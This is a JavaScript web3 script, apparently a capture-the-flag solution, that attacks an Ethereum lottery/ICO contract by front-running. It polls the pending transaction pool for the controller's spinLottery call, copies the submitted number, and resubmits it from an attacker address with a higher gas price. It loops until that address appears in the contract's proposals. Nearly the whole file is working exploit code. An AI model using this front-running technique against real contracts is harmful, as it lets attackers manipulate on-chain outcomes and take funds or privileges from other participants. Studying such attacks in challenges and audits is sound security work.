var Web3 = require('web3');
var web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));

// don't forget change addresses
const ICO = "0x529164937917ca981db36e727727229a4a8887be";
const ROBOT = "0x3a0c7287b9aac3c71ee8b9048c5dfb989f2a4d54";
const LOSER = "0xc24c2841b87694e546a093ac0da6565c8fdd1800";

const abi_i = [{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"desires","outputs":[{"name":"email","type":"string"},{"name":"active","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"isDesirous","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"isWhitelisted","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_newController","type":"address"}],"name":"changeController","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_email","type":"string"}],"name":"changeUrl","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_email","type":"string"}],"name":"proposal","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"whitelist","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"buy","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"who","type":"address"}],"name":"addParticipant","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"lotteryBlock","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"flushLottery","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"removeProposal","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"players","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"controller","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"number","type":"uint256"}],"name":"spinLottery","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"hackAddress","type":"address"},{"name":"_whitelist","type":"address[]"},{"name":"_desires","type":"address[]"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"who","type":"address"},{"indexed":false,"name":"url","type":"string"}],"name":"Proposal","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"who","type":"address"}],"name":"RemoveProposal","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"who","type":"address"}],"name":"AddParticipant","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"who","type":"address"}],"name":"NewLotteryBet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"block","type":"uint256"}],"name":"NewLotteryRound","type":"event"}];
var ico = web3.eth.contract(abi_i).at(ICO);

var hacked = false;
while (!hacked) {
    // get all pending pool
    var transactions = web3.eth.getBlock("pending").transactions;

    transactions.forEach(function (hash) {
        var tx = web3.eth.getTransaction(hash);

        // tx with lottery number happened
        if (tx.from === ROBOT && tx.to === ICO && tx.input.slice(0, 10) === '0xfaddef83') {
            console.log('\n-------------New round detected!---------------');
            var number = web3.toBigNumber('0x' + tx.input.slice(10)).toNumber();
            console.log('Controller submit new number:', number);

            // send tx with same number but higher gasPrice
            var spinTx = ico.spinLottery(number, {from: LOSER, gasPrice: tx.gasPrice.toNumber() + 1337});
            console.log("Spinnig lottery by", spinTx);

            // dummy waiting, but work :)
            while (web3.eth.getTransactionReceipt(spinTx) === null){ /* wait for mining */ }


            if (web3.toBigNumber(web3.eth.getTransactionReceipt(spinTx).status).toNumber()) {
                console.log('Transaction successully mined at', web3.eth.getTransactionReceipt(spinTx).blockNumber, 'block. Let\'s check proposals...');
                var desire = ico.desires.call(LOSER);

                // check the thick have been worked well
                if (desire[1] === true) {
                    console.log('The', LOSER, 'in proposals! SUCCESS!!!');
                    hacked = true
                } else {
                    console.log('The', LOSER, 'NOT in proposals! Just wait next round.')
                }
            } else {
                console.log('Spining went wrong...')
            }
        }
    });
}
